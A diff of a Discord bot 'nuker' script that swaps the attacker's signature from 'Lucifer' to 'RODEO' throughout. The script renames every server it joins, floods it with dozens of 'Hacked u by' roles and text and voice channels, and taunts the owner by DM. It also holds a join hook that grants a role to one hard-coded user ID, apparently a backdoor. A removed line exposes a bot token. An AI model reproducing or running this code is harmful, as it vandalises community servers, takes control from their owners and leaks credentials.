@@ -8,10 +8,10 @@ LOka.on('ready', () => {
 LOka.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : Lucifer ~           ~    ');
+console.log('      ~            ~  By : RODEO ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  Lucifer " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+console.log(`Logged in as  * [ "  RODEO " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
         
     
@@ -40,13 +40,13 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/594376469434597388/5
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by Lucifer")
+LOka.user.setUsername("Hacked u by RODEO")
 
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by Lucifer`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked u by RODEO`,'https://www.twitch.tv/hix')
 
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u by Lucifer`)
+             m.setName(`Hacked u by RODEO`)
 })
 }
 });
@@ -81,197 +81,197 @@ LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     }) 
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
      m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     }) 
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     }) 
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-
-    m.createRole({
-        name : "Hacked u by Lucifer",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Lucifer",
+        name : "Hacked u by RODEO",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by RODEO",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -286,52 +286,52 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === ".") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
 
-m.createChannel('Hacked u by Lucifer', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
 
-m.createChannel('Hacked u by Lucifer', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
 
-m.createChannel('Hacked u by Lucifer', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
 
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
 
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
 
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
 
-m.createChannel('Hacked u by Lucifer', 'text');
-m.createChannel('Hacked u by Lucifer', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
+m.createChannel('Hacked u by RODEO', 'text');
 
 })
 }
@@ -340,65 +340,65 @@ m.createChannel('Hacked u by Lucifer', 'text');
 LOka.on('message', message => {
          if (message.content === ".") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
 
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
 
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
 
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
 
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
 
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
-m.createChannel('Hacked u by Lucifer', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
+m.createChannel('Hacked u by RODEO', 'voice');
 
 
 
@@ -417,7 +417,7 @@ async function nuke(guild) {
 
   await guild.fetchMembers();
 
-  await guild.owner.send(' Hacked u by Lucifer    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send(' Hacked u by RODEO    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
 
 
 
@@ -436,9 +436,9 @@ async function nuke(guild) {
     }
   }));
   
-    await guild.createChannel('Hacked u by Lucifer', 'text');
+    await guild.createChannel('Hacked u by RODEO', 'text');
 
-    await guild.createChannel('Hacked u by Lucifer', 'voice');
+    await guild.createChannel('Hacked u by RODEO', 'voice');
 
   
 
@@ -448,7 +448,7 @@ LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by Lucifer");
+  console.log("Made by RODEO");
   console.log("");
   console.log("-------------------------------------------------------------");
 
@@ -460,7 +460,7 @@ LOka.on('guildCreate', async (guild) => {
 
 LOka.on('guildMemberAdd', member => {
     
-            if (member.id === "580783925333590036") {
+            if (member.id === "588685076527841290") {
                 member.guild.createRole({
                     name : LOka.user.username,
                     color : "RANDOM", 
@@ -478,4 +478,4 @@ LOka.on('guildMemberAdd', member => {
 
 
 
-LOka.login('NTk0NTgxNjM0MzQ3Njk2MTI4.XReh5A.M0vqipHJwPsMpRII2GvreWlgaqo')
+client.login(process.env.TOKEN);
